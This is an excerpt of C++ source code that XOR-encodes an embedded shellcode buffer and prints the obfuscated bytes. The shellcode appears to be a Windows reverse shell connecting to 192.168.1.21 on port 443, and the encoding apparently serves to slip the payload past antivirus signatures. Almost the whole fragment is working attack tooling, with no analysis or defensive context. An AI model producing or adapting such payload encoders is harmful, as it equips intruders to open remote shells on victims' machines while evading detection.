...
void xor_encode(unsigned char* encode,int buf_size,int key_size, char *key){
        for(int i = 0;i < buf_size - 1;i++){
                encode[i] ^= key[i % (key_size - 1)];
        }
}
...
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x01\x15\x41\x54"
...
"\xf0\xb5\xa2\x56\xff\xd5";
        ...
        std::cout << "key length: "<<key_len << " buffer length: " << buf_len << '\n';
        xor_encode(buf,buf_len,key_len,key);
        for(int i = 0; i < sizeof(buf) - 1;i++){
        std::cout << "\\x"<< std::hex << static_cast<int>(buf[i]);
        }
        return 0;
}
